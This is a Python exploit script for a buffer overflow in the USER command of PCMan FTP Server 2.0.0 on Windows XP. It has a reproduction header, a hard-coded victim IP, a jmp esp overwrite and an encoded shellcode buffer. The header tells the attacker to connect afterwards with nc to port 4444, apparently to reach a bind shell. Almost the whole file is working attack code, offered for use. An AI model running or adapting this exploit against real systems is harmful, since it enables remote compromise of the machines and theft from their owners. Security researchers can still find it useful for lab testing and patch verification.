#!/usr/bin/python
# Exploit Title: 	PCMan FTP Server  v2.0.0 USER Buffer Overflow
# Vendor Homepage: 	http://www.pcmanftp.com
# Date: 		30 Nov 2021
# Author: 		Adam K Chemiron (SaintNada)
# Platform:		Windows
# Tested on:		Windows XP SP 2
# CVE:			N/A

# Steps to reproduce:
# 1. Download and install PCMan FTP server
# 2. Start the server listening on port 21
# 3. Edit the host IP to that of the victim machine
# 4. Run the script on attacker machine
# 5. Connect remotely using; nc "Victim IP" 4444

import socket 
s = socket.socket()

host = "192.168.80.31"
port = 21

print "[*] Connecting to target..."
s.connect((host, port))
banner = s.recv(1024)
print "[*] Displaying Banner: " + banner

Junk1 = "\x90" * 2006
EIP = "\x3b\x69\x5a\x77" #jmp esp
nop = "\x90" * 16	
buf =  b""
buf += b"\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x33\xa7\x94\xfa\x83\xee\xfc\xe2\xf4\xcf\x4f"
buf += b"\x16\xfa\x33\xa7\xf4\x73\xd6\x96\x54\x9e\xb8\xf7\xa4"
buf += b"\x71\x61\xab\x1f\xa8\x27\x2c\xe6\xd2\x3c\x10\xde\xdc"
buf += b"\x02\x58\x38\xc6\x52\xdb\x96\xd6\x13\x66\x5b\xf7\x32"
buf += b"\x60\x76\x08\x61\xf0\x1f\xa8\x23\x2c\xde\xc6\xb8\xeb"
buf += b"\x85\x82\xd0\xef\x95\x2b\x62\x2c\xcd\xda\x32\x74\x1f"
buf += b"\xb3\x2b\x44\xae\xb3\xb8\x93\x1f\xfb\xe5\x96\x6b\x56"
buf += b"\xf2\x68\x99\xfb\xf4\x9f\x74\x8f\xc5\xa4\xe9\x02\x08"
buf += b"\xda\xb0\x8f\xd7\xff\x1f\xa2\x17\xa6\x47\x9c\xb8\xab"
buf += b"\xdf\x71\x6b\xbb\x95\x29\xb8\xa3\x1f\xfb\xe3\x2e\xd0"
buf += b"\xde\x17\xfc\xcf\x9b\x6a\xfd\xc5\x05\xd3\xf8\xcb\xa0"
buf += b"\xb8\xb5\x7f\x77\x6e\xcf\xa7\xc8\x33\xa7\xfc\x8d\x40"
buf += b"\x95\xcb\xae\x5b\xeb\xe3\xdc\x34\x58\x41\x42\xa3\xa6"
buf += b"\x94\xfa\x1a\x63\xc0\xaa\x5b\x8e\x14\x91\x33\x58\x41"
buf += b"\x90\x3b\xfe\xc4\x18\xce\xe7\xc4\xba\x63\xcf\x7e\xf5"
buf += b"\xec\x47\x6b\x2f\xa4\xcf\x96\xfa\x22\xfb\x1d\x1c\x59"
buf += b"\xb7\xc2\xad\x5b\x65\x4f\xcd\x54\x58\x41\xad\x5b\x10"
buf += b"\x7d\xc2\xcc\x58\x41\xad\x5b\xd3\x78\xc1\xd2\x58\x41"
buf += b"\xad\xa4\xcf\xe1\x94\x7e\xc6\x6b\x2f\x5b\xc4\xf9\x9e"
buf += b"\x33\x2e\x77\xad\x64\xf0\xa5\x0c\x59\xb5\xcd\xac\xd1"
buf += b"\x5a\xf2\x3d\x77\x83\xa8\xfb\x32\x2a\xd0\xde\x23\x61"
buf += b"\x94\xbe\x67\xf7\xc2\xac\x65\xe1\xc2\xb4\x65\xf1\xc7"
buf += b"\xac\x5b\xde\x58\xc5\xb5\x58\x41\x73\xd3\xe9\xc2\xbc"
buf += b"\xcc\x97\xfc\xf2\xb4\xba\xf4\x05\xe6\x1c\x64\x4f\x91"
buf += b"\xf1\xfc\x5c\xa6\x1a\x09\x05\xe6\x9b\x92\x86\x39\x27"
buf += b"\x6f\x1a\x46\xa2\x2f\xbd\x20\xd5\xfb\x90\x33\xf4\x6b"
buf += b"\x2f"
Junk2 = "\x90" * 2622

payload = Junk1 + EIP + nop + buf + Junk2

Delimeter = " "
Username = "root"
finished = "\r\n"

print "[*] Initiating crash sequence..."
s.send(payload + Delimeter + Username + finished )

print "[*] Crash sequence complete. Connect to Target."

s.close()

